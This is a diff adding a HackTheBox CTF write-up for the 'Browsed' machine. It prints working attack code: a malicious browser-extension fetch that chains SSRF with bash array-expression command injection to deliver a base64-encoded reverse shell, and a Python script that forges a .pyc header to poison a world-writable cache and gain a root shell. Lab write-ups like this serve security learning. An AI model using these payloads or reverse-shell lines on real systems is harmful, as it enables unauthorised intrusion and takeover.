@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Browsed - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Browsed.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Browsed machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Browsed machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Browsed, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,320 @@
         <h1 class="writeup-title">Browsed</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">March 28, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
                 <p><img alt="pwned" src="../images/Browsed/pwned.png" /></p>
-<p>Browsed is an ACTIVE machine!</p>
-<p>This write-up will go live once Browsed retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+<p>Browsed was a medium-difficulty Linux machine that began with an nmap scan revealing SSH on port 22 and HTTP on port 80.
+The web application hosted an extension upload mechanism that accepted ZIP archives, with a note indicating that someone would run the uploaded extensions.
+Downloading and inspecting the example extension revealed a standard browser extension structure. Uploading the legitimate example and observing the execution logs exposed an internal hostname, which was added to the hosts file and led to a Gitea instance.
+Browsing Gitea anonymously revealed a single publicly visible repository for a Flask-based Markdown Previewer. The app exposed a /routines endpoint that passed a parameter directly as an argument to a bash script. The script used the parameter in -eq comparisons across several conditional branches.
+A known bash trick allowed command injection via array expression syntax, where passing a[$(cmd)] causes bash to evaluate the embedded command before the -eq operator is ever reached, regardless of which branch is taken.
+Since the Flask app was bound to localhost on port 5000, it was not directly reachable, making SSRF the required approach.
+The browser extension's manifest permitted content scripts to run on all URLs at document_idle, meaning injected JavaScript would execute across any page the victim visited.
+A malicious content.js payload was crafted using fetch to reach the internal Flask app at 127.0.0.1:5000/routines/, with the route parameter containing a URL-encoded array expression that decoded and executed a base64-encoded bash reverse shell.
+Packaging the modified extension as a ZIP and uploading it caused the victim to run it, triggering the SSRF chain and delivering a shell as the user larry.</p>
+<p>For privilege escalation, an SSH key was injected into larry's authorized_keys for persistence. Enumeration revealed that larry could run a custom Python script as root via sudo.
+While the script itself contained no obvious vulnerability, its <strong>pycache</strong> directory was world-writable. Python validates cached .pyc files against the source file's modification time and size before using them, and if these match, the cached bytecode is executed without recompilation.
+A malicious extension_utils.py was written containing a reverse shell payload alongside stub implementations of the functions expected by the main script, ensuring the file size matched the original.
+The file was compiled locally, and its .pyc header was then forged using Python's struct module to replace the magic bytes, null out the flags field to force timestamp-based validation, and inject the real source file's mtime and size as little-endian 32-bit integers.
+The forged .pyc was copied into the world-writable cache directory, and running the sudo command caused Python to accept the poisoned bytecode and execute the payload as root.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Browsed/nmap.png" /></p>
+<p>Initial nmap scan reveals just 2 open ports. SSH on 22, and HTTP on 80.</p>
+<h2>Recon on the website</h2>
+<p><img alt="webste" src="../images/Browsed/webste.png" /></p>
+<p>There is an upload extension button in the corner, so I'll check it out asap.</p>
+<p><img alt="upload" src="../images/Browsed/upload.png" /></p>
+<p>It accepts .zip archives for extenions, and mentions that <em>someone</em> will run the uploads. There is also an example page, from which I'll download the first entry.</p>
+<p><img alt="tree" src="../images/Browsed/tree.png" /></p>
+<p>Pretty standard extension structure. Before doing anything, I'll upload the legitimate one to see what a good result looks like and what it reveals.</p>
+<p><img alt="execution" src="../images/Browsed/execution.png" /></p>
+<p>Whatever is on the other side, it has successfully installed/used the extension. While scrolling through the logs, I saw the highlighted URL. I will add it to my hosts file right away.</p>
+<h2>Investigating the source code on Gitea</h2>
+<p><img alt="gitea" src="../images/Browsed/gitea.png" /></p>
+<p>Under the URL, a Gitea instance is accessible. I don't have any credentials, of course, so I'll just see whether there's any repo that can be viewed by guests/anonymously.</p>
+<p><img alt="repo" src="../images/Browsed/repo.png" /></p>
+<p>There is a single repo for <code>MarkdownViewer</code> available. The description states:</p>
+<p><code>This webapp allows us to convert our md files to html. Still in developement, it should only run locally !!!</code></p>
+<p>So let's make sure whether the code is following this guideline.</p>
+<pre class="codehilite"><code># app.py
+
+from flask import Flask, request, send_from_directory, redirect
+from werkzeug.utils import secure_filename
+
+import markdown
+import os, subprocess
+import uuid
+
+app = Flask(__name__)
+FILES_DIR = &quot;files&quot;
+
+# Ensure the files/ directory exists
+os.makedirs(FILES_DIR, exist_ok=True)
+
+@app.route('/')
+def index():
+    return '''
+    &lt;h1&gt;Markdown Previewer&lt;/h1&gt;
+    &lt;form action=&quot;/submit&quot; method=&quot;POST&quot;&gt;
+        &lt;textarea name=&quot;content&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;&lt;/textarea&gt;&lt;br&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Render &amp; Save&quot;&gt;
+    &lt;/form&gt;
+    &lt;p&gt;&lt;a href=&quot;/files&quot;&gt;View saved HTML files&lt;/a&gt;&lt;/p&gt;
+    '''
+
+
+@app.route('/submit', methods=['POST'])
+def submit():
+    content = request.form.get('content', '')
+    if not content.strip():
+        return 'Empty content. &lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;'
+
+    # Convert markdown to HTML
+    html = markdown.markdown(content)
+
+    # Save HTML to unique file
+    filename = f&quot;{uuid.uuid4().hex}.html&quot;
+    filepath = os.path.join(FILES_DIR, filename)
+    with open(filepath, 'w') as f:
+        f.write(html)
+
+    return f'''
+    &lt;p&gt;File saved as &lt;code&gt;{filename}&lt;/code&gt;.&lt;/p&gt;
+    &lt;p&gt;&lt;a href=&quot;/view/{filename}&quot;&gt;View Rendered HTML&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+    '''
+
+@app.route('/files')
+def list_files():
+    files = [f for f in os.listdir(FILES_DIR) if f.endswith('.html')]
+    links = '\n'.join([f'&lt;li&gt;&lt;a href=&quot;/view/{f}&quot;&gt;{f}&lt;/a&gt;&lt;/li&gt;' for f in files])
+    return f'''
+    &lt;h1&gt;Saved HTML Files&lt;/h1&gt;
+    &lt;ul&gt;{links}&lt;/ul&gt;
+    &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Back to editor&lt;/a&gt;&lt;/p&gt;
+    '''
+
+@app.route('/routines/&lt;rid&gt;')
+def routines(rid):
+    # Call the script that manages the routines
+    # Run bash script with the input as an argument (NO shell)
+    subprocess.run([&quot;./routines.sh&quot;, rid])
+    return &quot;Routine executed !&quot;
+
+@app.route('/view/&lt;filename&gt;')
+def view_file(filename):
+    filename = secure_filename(filename)
+    if not filename.endswith('.html'):
+        return &quot;Invalid filename&quot;, 400
+    return send_from_directory(FILES_DIR, filename)
+
+# The webapp should only be accessible through localhost
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000)
+</code></pre>
+
+<p>This Flask app is running locally on port 5000. I don't immediately see any useful vulnerabilities, but the <code>routines</code> endpoint comments mention a bash script <code>routines.sh</code>, which also happens to be in this repository.</p>
+<pre class="codehilite"><code># routines.sh
+
+#!/bin/bash
+
+ROUTINE_LOG=&quot;/home/larry/markdownPreview/log/routine.log&quot;
+BACKUP_DIR=&quot;/home/larry/markdownPreview/backups&quot;
+DATA_DIR=&quot;/home/larry/markdownPreview/data&quot;
+TMP_DIR=&quot;/home/larry/markdownPreview/tmp&quot;
+
+log_action() {
+  echo &quot;[$(date '+%Y-%m-%d %H:%M:%S')] $1&quot; &gt;&gt; &quot;$ROUTINE_LOG&quot;
+}
+
+if [[ &quot;$1&quot; -eq 0 ]]; then
+  # Routine 0: Clean temp files
+  find &quot;$TMP_DIR&quot; -type f -name &quot;*.tmp&quot; -delete
+  log_action &quot;Routine 0: Temporary files cleaned.&quot;
+  echo &quot;Temporary files cleaned.&quot;
+
+elif [[ &quot;$1&quot; -eq 1 ]]; then
+  # Routine 1: Backup data
+  tar -czf &quot;$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz&quot; &quot;$DATA_DIR&quot;
+  log_action &quot;Routine 1: Data backed up to $BACKUP_DIR.&quot;
+  echo &quot;Backup completed.&quot;
+
+elif [[ &quot;$1&quot; -eq 2 ]]; then
+  # Routine 2: Rotate logs
+  find &quot;$ROUTINE_LOG&quot; -type f -name &quot;*.log&quot; -exec gzip {} \;
+  log_action &quot;Routine 2: Log files compressed.&quot;
+  echo &quot;Logs rotated.&quot;
+
+elif [[ &quot;$1&quot; -eq 3 ]]; then
+  # Routine 3: System info dump
+  uname -a &gt; &quot;$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt&quot;
+  df -h &gt;&gt; &quot;$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt&quot;
+  log_action &quot;Routine 3: System info dumped.&quot;
+  echo &quot;System info saved.&quot;
+
+else
+  log_action &quot;Unknown routine ID: $1&quot;
+  echo &quot;Routine ID not implemented.&quot;
+fi
+</code></pre>
+
+<p>This script is vulnerable to command injection. It takes the first argument (rid, known from app.py) and concatenates it into <code>eq</code> operators in this conditional tree. It doesn't matter which one is hit, because they are all vulnerable in the same way.</p>
+<p>There is a known trick with array expressions and -eq operators where if we pass a command like <code>a[$(echo hi)]</code> into -eq, bash will first evaluate the expression and execute the command before even touching the operator. I encountered this trick for the first time in the <code>Eureka</code> box, which retired quite a few months ago.</p>
+<h2>Trying to exploit the SSRF + Code execution chain via extension upload</h2>
+<p>Knowing that the local app is vulnerable to code injection, my plan looks like this:</p>
+<ol>
+<li>
+<p>Craft a JS payload that forces the user to <code>http://127.0.0.1:5000/routines/{CMD}</code></p>
+</li>
+<li>
+<p>Create a command that will grant me a reverse shell.</p>
+</li>
+</ol>
+<p>First, I'll make sure that <code>fetch</code> works, and that the user can reach my box. I'll modify content.js to contain this small line of code below.</p>
+<p><code>fetch('http://10.10.16.213:8000/hit')</code></p>
+<p><img alt="caught" src="../images/Browsed/caught.png" /></p>
+<p>This successfully reaches my listener. Before going further, I'll analyze the <code>manifest.js</code> file to see what limitations have been set for this extension.</p>
+<pre class="codehilite"><code>{
+  &quot;manifest_version&quot;: 3,
+  &quot;name&quot;: &quot;Font Switcher&quot;,
+  &quot;version&quot;: &quot;2.0.0&quot;,
+  &quot;description&quot;: &quot;Choose a font to apply to all websites!&quot;,
+  &quot;permissions&quot;: [
+    &quot;storage&quot;,
+    &quot;scripting&quot;
+  ],
+  &quot;action&quot;: {
+    &quot;default_popup&quot;: &quot;popup.html&quot;,
+    &quot;default_title&quot;: &quot;Choose your font&quot;
+  },
+  &quot;content_scripts&quot;: [
+    {
+      &quot;matches&quot;: [
+        &quot;&lt;all_urls&gt;&quot;
+      ],
+      &quot;js&quot;: [
+        &quot;content.js&quot;
+      ],
+      &quot;run_at&quot;: &quot;document_idle&quot;
+    }
+  ]
+}
+</code></pre>
+
+<p>This essentially means that the loaded scripts (right now content.js) will run on all URLs. Aside from that, the <code>document_idle</code> run setting means that it'll run either after window.onload has fired, or it's been 200ms since DOMContentLoaded has fired.</p>
+<p><a href="https://stackoverflow.com/questions/33248629/when-does-a-run-at-document-idle-content-script-run">https://stackoverflow.com/questions/33248629/when-does-a-run-at-document-idle-content-script-run</a></p>
+<p>So that confirms I can execute code in the extensions, no matter which page the user gets shoved into(at least in theory, not taking into account various security principles that could be at play)</p>
+<p>The payload I came up with looks like this:</p>
+<p><code>fetch('http://127.0.0.1:5000/routines/a[$(echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjEzLzkwMDEgMD4mMQo=|base64 -d|bash)]')</code></p>
+<p>And I just URL-encoded everything after the letter <code>a</code>, resulting in the following final payload:</p>
+<p><code>fetch('http://127.0.0.1:5000/routines/a%5B%24%28echo%20YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjEzLzkwMDEgMD4mMQo%3D%7Cbase64%20-d%7Cbash%29%5D')</code></p>
+<p><img alt="encode" src="../images/Browsed/enccode.png" /></p>
+<p>Now I'll upload the modified extension, with a netcat listener active on port 9001.</p>
+<p><img alt="user" src="../images/Browsed/user.png" /></p>
+<h1>Root flag</h1>
+<p>I injected an SSH key into Larry's <code>authorized_keys</code> for persistence, prior to doing any recon on the box.</p>
+<p><img alt="injection" src="../images/Browsed/injection.png" /></p>
+<p>Larry can run a custom Python script as root. I don't see an obvious vulnerability within the script itself, however...</p>
+<p><img alt="writable" src="../images/Browsed/writable.png" /></p>
+<p>The cache directory is world-writable. This is where Python stores .pyc files containing compiled bytecode of scripts to speed up execution. Being able to write here is an excellent opportunity for escalation.</p>
+<h2>Creating a malicious Python cache file</h2>
+<pre class="codehilite"><code>import py_compile
+import os
+
+f = open(&quot;extension_utils.py&quot;, &quot;x&quot;)
+
+f.write(&quot;import os\nos.system('nc -e /bin/sh 10.10.16.213 9001')&quot;)
+
+py_compile.compile('extension_utils.py')
+
+os.system('cp __pycache__/extension_utils.cpython-312.pyc /opt/extensiontool/__pycache__')
+</code></pre>
+
+<p>The idea here is that we're compiling the simple reverse shell script, which will create a .pyc cache. Then this cache gets copied into the world-writable directory.</p>
+<p><img alt="overwrite" src="../images/Browsed/overwrite.png" /></p>
+<p>However, the small cache I've created got overwritten. This is because Python does a few checks to make sure the cache is not "stale", comparing the bytecode against the source's timestamp and size. If these don't match, the old cache gets deleted and recompiled from source.</p>
+<p><a href="https://hardsoftsecurity.es/index.php/2026/01/19/python-cache-poisoning-privesc-linux/">https://hardsoftsecurity.es/index.php/2026/01/19/python-cache-poisoning-privesc-linux/</a></p>
+<pre class="codehilite"><code>import py_compile
+import os
+import struct
+
+real_path = &quot;/opt/extensiontool/extension_utils.py&quot;
+target_pyc = &quot;/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc&quot;
+
+# 1. Create malicious source
+f = open(&quot;extension_utils.py&quot;, &quot;w&quot;)
+f.write(&quot;&quot;&quot;import os
+
+# Payload
+os.system(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.213/9001 0&gt;&amp;1'&quot;)
+
+# Required functions. This also helps with the size check
+def get_extensions():
+    return ['Fontify', 'Timer', 'ReplaceImages']
+
+def validate_extension(ext):
+    return ext in get_extensions()
+
+def validate_manifest(*args, **kwargs):
+    return True
+
+def clean_temp_files(*args, **kwargs):
+    return None
+&quot;&quot;&quot;)
+f.close()
+
+# 2. Compile it
+py_compile.compile(&quot;extension_utils.py&quot;)
+
+# 3. Read compiled pyc
+with open(&quot;__pycache__/extension_utils.cpython-312.pyc&quot;, &quot;rb&quot;) as f:
+    data = f.read()
+
+# 4. Get real metadata
+st = os.stat(real_path)
+mtime = int(st.st_mtime)
+size = st.st_size &amp; 0xffffffff
+
+# 5. Forge header
+magic = data[:4]
+flags = b&quot;\x00\x00\x00\x00&quot;
+
+header = (
+    magic +
+    flags +
+    struct.pack(&quot;&lt;I&quot;, mtime) +
+    struct.pack(&quot;&lt;I&quot;, size)
+)
+
+# 6. Combine header + bytecode
+final_pyc = header + data[16:]
+
+# 7. Write to target
+with open(target_pyc, &quot;wb&quot;) as f:
+    f.write(final_pyc)
+
+print(&quot;[+] Poisoned pyc written&quot;)
+</code></pre>
+
+<p>For the first 16 bytes of each .pyc:</p>
+<p><code>[ magic ][ flags ][ mtime ][ size ]</code></p>
+<p>For the header-forging part, we're setting the magic bytes to the correct Python version(in this case, 3.12). Then the flag value is set to null bytes, which means that the validation will be done via timestamps. Hash-based verification would make this exploit much harder to pull off.</p>
+<p>As for the last 2 fields in the header, we're converting the numbers into 4-byte little-endian integers:</p>
+<pre class="codehilite"><code># Example conversion with struct.pack
+1742727379 → d3 e8 df 67
+
+1245 → dd 04 00 00
+</code></pre>
+
+<p><img alt="frozen" src="../images/Browsed/frozen.png" /></p>
+<p>After running the script and the sudo command, it froze for a bit. And when I looked at my listener tab, I saw a root shell hitting my listener.</p>
+<p><img alt="root" src="../images/Browsed/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
